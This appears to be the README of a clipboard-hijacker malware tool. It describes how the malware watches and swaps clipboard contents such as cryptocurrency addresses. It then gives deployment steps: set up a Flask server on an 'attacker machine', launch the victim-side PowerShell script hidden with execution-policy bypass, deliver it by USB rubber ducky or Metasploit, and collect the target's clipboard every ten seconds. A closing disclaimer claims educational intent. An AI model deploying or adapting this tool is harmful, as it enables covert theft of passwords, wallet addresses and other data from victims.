# Clipboard_Hijacker
A Clipboard Hijacker is a type of malware or script designed to monitor and manipulate the contents of a system’s clipboard. This is particularly dangerous in contexts where users copy sensitive data (like cryptocurrency addresses, passwords, or command-line instructions). The attacker typically replaces clipboard contents with their own data, often unnoticed by the victim.

# What Does a Clipboard Hijacker Do?
## Monitors Clipboard Activity :
Continuously checks the system clipboard for changes.
Typically runs silently in the background.

## Checks for Specific Patterns:
Looks for specific formats (e.g., Bitcoin wallet addresses, URLs, credit card numbers).
Uses regex to identify such patterns.
Replaces Clipboard Content:

## Injects attacker-controlled data (e.g., attacker's wallet address).
Victim unknowingly pastes the attacker’s data instead of their own.

# How to use
Run Flask webserver your attacker machine using python so you need to install flask.

python3 -m pip install flask
Now you can run the following command for run the server

python3 server.py
change your webserver's IP address in clipboardhijacker.ps1 file & run this script using following command or other method like USB rubber ducky, metasploit command execution etc.

## 1. For Windows
#### powershell -NoP -NonI -W h -Exec Bypass .\clipBoardHijacker.ps1
## 2. For Linux
###   Dependencies: The Bash script requires xclip, curl, and jq, which are easily installed on most Linux distributions. On macOS, you can replace xclip with pbpaste and adjust the script accordingly.
   
#### chmod +x clipBoardHijacker.sh
#### ./clipBoardHijacker.sh

After that your webserver will getting target machine clipboard data in every 10 sec.

# Ethical and Legal Warning
Using or distributing clipboard hijackers for malicious purposes is illegal and unethical. This information is intended only for educational and awareness purposes (e.g., malware analysis, red teaming with permission, or teaching cybersecurity concepts).
